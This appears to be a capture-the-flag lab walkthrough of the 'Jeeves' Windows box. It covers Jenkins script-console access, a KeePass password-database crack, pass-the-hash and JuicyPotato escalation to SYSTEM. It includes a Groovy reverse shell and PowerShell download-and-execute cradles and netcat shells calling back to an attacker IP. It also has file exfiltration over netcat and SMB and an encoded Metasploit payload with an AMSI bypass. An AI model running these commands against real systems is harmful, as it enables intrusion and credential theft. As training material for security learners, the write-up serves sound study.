# Reconnaissance
## Nmap Enumeration
- We pass the commands:
	```bash
nmap -sV -sC -vv 10.10.10.63
nmap -sU --top-ports=10 -vv 10.10.10.63
---OUTPUT-TCP---
PORT      STATE SERVICE      REASON          VERSION
80/tcp    open  http         syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
445/tcp   open  microsoft-ds syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         syn-ack ttl 127 Jetty 9.4.z-SNAPSHOT
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-04-10T01:48:22
|_  start_date: 2025-04-10T01:47:34
|_clock-skew: mean: -2h41m52s, deviation: 0s, median: -2h41m52s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 55172/tcp): CLEAN (Timeout)
|   Check 2 (port 19524/tcp): CLEAN (Timeout)
|   Check 3 (port 48293/udp): CLEAN (Timeout)
|   Check 4 (port 34146/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```
	- http 80 
	- smb security mode?
		- guest user
	- Jetty 9.4.2
	- port 50000 :ibm-db2 (got this from -sT -p- nmap scan)
## Directory Enumeration
- Gobuster:
	- Directory
		```bash
gobuster dir -u http://10.10.10.63:50000 dns --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.root

---OUTPUT---
/askjeeves            (Status: 302) [Size: 0] [--> http://10.10.10.63:50000/askjeeves/]
```
		- Tried with dirb/big.txt and got nothing
- Ffuf gave nothing
- Dirsearch gve nothing
- Dirbuster
	![[Pasted image 20250410014800.png]]

## Website Enumeration
- 10.10.10.63:80 - fake website, source code reveals it just goes to error.html?
	- The error is simply an image
	- Also we know Windows Server 2016...yet error is 2009
- 10.10.10.63:50000/askjeeves
	- leads to jenkins website
	- If we remember what we did in Linux builder, there should be a script console for groovy scripts:
		- Manage Jenkins > Script Console (manage/script)
		- https://gist.github.com/rootsecdev/273f22a747753e2b17a2fd19c248c4b7
			- Execute the script with netcat listening.
				```bash
String host="10.10.14.25";
int port=9999;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
			- We get a shell as jeeves/kohsuke
				- we can also use this to test:
					```bash
cmd = "whoami"
println cmd.execute().text
```
				- And then get a shell by using nishangs tcpreverseshell.ps1
					```bash
sudo cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 .
mv Invoke-PowerShellTcp.ps1 rev.ps1 # make sure to edit to your Ip and listener
cmd = """ powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.25:8001/rev.ps1')" """
println cmd.execute().text
```
					- We get shell
				- Can also try (doesn't work):
					```bash
cmd = """ powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.25:8001/nc.exe')" """
cmd2 = """ nc.exe -e 10.10.14.25 9999 """
println cmd.execute().text
println cmd2.execute().text


---OR---
```
	- Alternatively, though not recommended as it's noisy (can be seen), we can create a project and under Build we sellect Windows batch command.
		- Here we can execute windows cmd commands.
		- We host a server where we have nc.exe and 
			```bash
powershell wget "http://10.10.14.25:8001/nc.exe" -outfile "nc.exe"
nc.exe -e cmd.exe 10.10.14.25 9999 
```
		- I also tried with execute shell built option but that didnt work
- we can get user.txt
- 
## Privilege Escalation
- secret.key in .jenkins file
	```bash
PS C:\Users\Administrator\.jenkins> type secret.key
58d05496da2496d09036d36c99b56f1e89cc662f3e65a4023de71de7e1df8afb
```
- We find CEH.kdbx and try to get it onto our machine
	- If we used reverse tcp powershell then we cannot send via netcat (i tried and the < operator doesn't work when trying to do the cmd command)
		- Then we need to create an smb share and copy the file:
			```bash
mkdir smb
cd smb
impacket-smbserver rocknrj 'pwd' #pwd is path

---ON-TARGET---
PS> New-PSDrive -Name "rocknrjay" -PSProvider "Filesystem" -Root "\\10.10.14.25\rocknrj"
cd rocknrjay:
cp C:\Users\kohsuke\Documents\CEH.kdbx .
```
	- If we don't use reverse tcp powershell, so either the groovy script we found in github or via the build, then we can execute netcat:
		```bash
---ON-LOCAL-MACHINE---
nc -lvnp 9999 > CEH.kdbx

---ON-TARGET-MACHINE---
cd C:\Users\kohsuke\Documents
C:\Users\Administrator\.jenkins\nc.exe 10.10.14.25 9999 < "C:\Users\kohsuke\Documents\CEH.kdbx"
```
		- Alternatively we can move it to .jenkins/workgroup and download it from jenkins dashboard at workgroups subdirectory.
- Now we retrieve the hash from this file on our local machine:
	```bash
keepass2john CEH.kdbx
keepass2john CEH.kdbx > CEH.hash

---OUTPUT---
CEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48
```
	- Then we attempt to crack it:
		```bash
john CEH.hash --wordlist=/usr/share/wordlists/rockyou.txt

---OUTPUT---
moonshine1       (CEH)
```
- We then retrieve the password from the keepass database:
	```bash
kpcli --kdb CEH.kdbx
> moonshine 1
ls
cd CEH
ls
---OR---
find .
--------
show -f 1
show -f 2
show -f 3
show -f 4
show -f 5
show -f 6
show -f 7

---OUTPUT-F-0---
Title: Backup stuff
Uname: ?
 Pass: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
  URL: 
Notes:

```
	- We also find other passwords which we put into a text file and tried to check with SMB (**they all fail**), to also add actually only the ntlm hash and admin password is needed to check as the other users aren't what we need but we check anyway:
		```bash
cat passwords
crackmapexec smb 10.10.10.63 -u Administrator -p passwords

---OUTPUT-PASSWORD---
12345
S1TjAtJHKsugh9oC4VZl
pwndyouall!
F7WhTrSFDKB6sxHU1cUn
lCEUnYPjNfIuPZSzOySA
Password
```
- We attempt to login cia Pass-the-Hash method:
	```bash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 administrator@10.10.10.63
```
	- If using winexe its `jenkins/administrator%<hash>`
- We gain access but can't find root flag:
	```bash
cd C:\Users\Administrator\Desktop
dir

---OUTPUT---
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   2,653,650,944 bytes free

```
	- We try to read hm.txt
		```bash
type hm.txt

---OUTPUT---
The flag is elsewhere.  Look deeper.
```
- We check for any alternate data streams with the /R argument:
	```bash
dir /R

---OUTPUT---
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   2,653,638,656 bytes free
```
	- To read the stream we pipe it into more (can use notepad or other methods...notepad would require a GUI though)
		```bash
more < hm.txt:root.txt

---OUTPUT---
afbc5bd4b615a60648cec41c6ac92530
```
		- We gain root flag
- If using powershell:
	```bash
cmd > powershell (Get-Content hm.txt -Stream root.txt)
```
## Alternate Privilege Escalation Method (Unintended, harder)
- Upload PowerUp.ps1
	```bash
IEX(New-Object Net.WebClient).downloadString("http://10.10.14.25:8001/PowerUp.ps1")
Invoke-AllChecks

---OUTPUT---
Privilege   : SeImpersonatePrivilege
Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
TokenHandle : 1488
ProcessId   : 3608
Name        : 3608
Check       : Process Token Privileges

ServiceName                     : jenkins
Path                            : "C:\Users\Administrator\.jenkins\jenkins.exe"
ModifiableFile                  : C:\Users\Administrator\.jenkins\jenkins.exe
ModifiableFilePermissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
ModifiableFileIdentityReference : JEEVES\kohsuke
StartName                       : .\kohsuke
AbuseFunction                   : Install-ServiceBinary -Name 'jenkins'
CanRestart                      : False
Name                            : jenkins
Check                           : Modifiable Service Files

UnattendPath : C:\Windows\Panther\Unattend.xml
Name         : C:\Windows\Panther\Unattend.xml
Check        : Unattended Install Files


```
- `Privilege   : SeImpersonatePrivilege` is not in master, only dev does.
	- This means we can use Rotten Potato exploit
	- we may be able to modify jenkins.exe but we can't restart it 
	- Modified Service File check : theres a service jenkins and we should be able to modify it and when it restarts, it starts our executable that we put in
	- We check unattended path but theres nothing
- Another command to check Privilege Names:
	```bash
whoami /priv

---OUTPUT---
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege *      Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```
-----------
**NOTE: THIS METHOD FAILED, FIXED METHOD AFTER THIS**
- https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/
	- https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/
		- Shows vulnerable tokens we could privesc from
	- We use unicorn to create a meterpreter shell:
		```bash
cd /opt/unicorn
sudo python unicorn.py
cp password_attack.txt /...../Jeeves/www/msf.txt
cp unicorn.rc /..../Jeeves/msf/
cd ...../Jeeves/
msfconsole -r unicorn.rc

---ON-TARGET---
IEX(New-Object Net.WebClient).downloadString("http://10.10.14.25:8001/msf.txt")
```
		- We should get meterpreter shell.
- load incognito let's us play with tokens
	```bash
session -i 1
load stdapi
load incognito
Loading extension incognito...Success.
help

---OUTPUT---
Incognito Commands
==================

    Command                   Description
    -------                   -----------
    add_group_user            Attempt to add a user to a global group with all tokens
    add_localgroup_user       Attempt to add a user to a local group with all tokens
    add_user                  Attempt to add a user with all tokens
    impersonate_token *       Impersonate specified token
    list_tokens      **       List tokens available under current user context
    snarf_hashes              Snarf challenge/response hashes for every token

```
	- We need list_tokens:
		```bash
list_tokens -u
list_tokens -g

---OUTPUT-1---
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
JEEVES\kohsuke

Impersonation Tokens Available
========================================
No tokens available

---OUTPUT-2---
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
BUILTIN\Users
NT AUTHORITY\Authenticated Users
NT AUTHORITY\Local account
NT AUTHORITY\LogonSessionId_0_113889
NT AUTHORITY\NTLM Authentication
NT AUTHORITY\SERVICE
NT AUTHORITY\This Organization

Impersonation Tokens Available
========================================
No tokens available
```
	- We execute rottenpotato.exe on Juicypotato.exe (make sure in right directory where it was sent)
		```bash
execute -cH -f rottenpotato.exe
---OR---
execute -cH -f JuicyPotato.exe
```
		- **DOESN'T WORK**... but we are supposed to get some Impersonation tokens
			- `BUILTIN\\Administrators`
				- We impersonate this token:
					```bash
impersonate_token "BUILTIN\\Administrators"
shell
> whoami

---OUTPUT---
Nt authority\system
```
-----------
**FIXED METHOD USING ONLY MSFCONSOLE**
- Since it doesn't work we try to exploit the whole thing via msfconsole.
	```bash
msfconsole
use exploit/multi/script/web_delivery
set srvhost 10.10.14.25
set lhost 10.10.14.25
set payload windows/meterpreter/reverse_tcp
show targets
set target 2  #PSH - Powershell
show options # to check if everything is fine
run


---OUTPUT-RUN---
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/script/web_delivery) > 
[*] Started reverse TCP handler on 10.10.14.25:4444 
[*] Using URL: http://10.10.14.25:8080/59QJSzp4mNxCu
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJAByAGkAegBwAFMAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAcgBpAHoAcABTAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAcgBpAHoAcABTAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMgA1ADoAOAAwADgAMAAvADUAOQBRAEoAUwB6AHAANABtAE4AeABDAHUALwBaAFQAeABHAFkAcAAnACkAKQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMgA1ADoAOAAwADgAMAAvADUAOQBRAEoAUwB6AHAANABtAE4AeABDAHUAJwApACkAOwA=
[*] 10.10.10.63      web_delivery - Delivering AMSI Bypass (1406 bytes)
[*] 10.10.10.63      web_delivery - Delivering Payload (3473 bytes)
[*] Sending stage (177734 bytes) to 10.10.10.63
[*] Meterpreter session 1 opened (10.10.14.25:4444 -> 10.10.10.63:49811) at 2025-04-11 03:51:30 -0400

```
	- We copy the output command to the target shell (remove powershell.exe from command if shell is already powershell)
		```bash
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJAByAGkAegBwAFMAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAcgBpAHoAcABTAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAcgBpAHoAcABTAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMgA1ADoAOAAwADgAMAAvADUAOQBRAEoAUwB6AHAANABtAE4AeABDAHUALwBaAFQAeABHAFkAcAAnACkAKQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMgA1ADoAOAAwADgAMAAvADUAOQBRAEoAUwB6AHAANABtAE4AeABDAHUAJwApACkAOwA=
```
		- We get a meterpreter shell.
			```bash
sessions -i 1
getuid
getprivs

---OUTPUT-UID---
Server username: JEEVES\kohsuke

---OUTPUT-PRIV---
Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege *
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```
	- We search for possible exploits:
		```bash
run post/multi/recon/local_exploit_suggester

---OUTPUT-MAIN---
 9   exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.                                                                           
 10  exploit/windows/local/ms16_075_reflection_juicy                Yes                      The target appears to be vulnerable.
```
		- These are RottenPotato and JuicyPotato exploits. Since JuicyPotato has more success rate we use that here but both should work.
	- We background the current session
		```bash
background

---OUTPUT---
[*] Backgrounding session 1...
```
	- We then use our exploit (path of reflecticy juicy)
		```bash
use exploit/windows/local/ms16_075_reflection_juicy
show options
set session 1
set lhost 10.10.14.25
run

---OUTPUT---
[-] Handler failed to bind to 10.10.14.25:4444:-  -
[-] Handler failed to bind to 0.0.0.0:4444:-  -
[+] Target appears to be vulnerable (Windows 10 version 1511)
[*] Launching notepad to host the exploit...
[+] Process 2996 launched.
[*] Reflectively injecting the exploit DLL into 2996...
[*] Injecting exploit into 2996...
[*] Exploit injected. Injecting exploit configuration into 2996...
[*] Configuration injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (177734 bytes) to 10.10.10.63
[*] Meterpreter session 2 opened (10.10.14.25:4444 -> 10.10.10.63:49818) at 2025-04-11 03:55:30 -0400

```
	- We see session 2 has started so we get into session 2 and check our user
		```bash
sessions -i 2
getuid
shell
> whoami

---OUTPUT-UID---
Server username: NT AUTHORITY\SYSTEM

---OUTPUT-SHELL---
nt authority\system
```
		- We can proceed to the root flag location and read the alternate data stream of hm.txt as discussed earlier.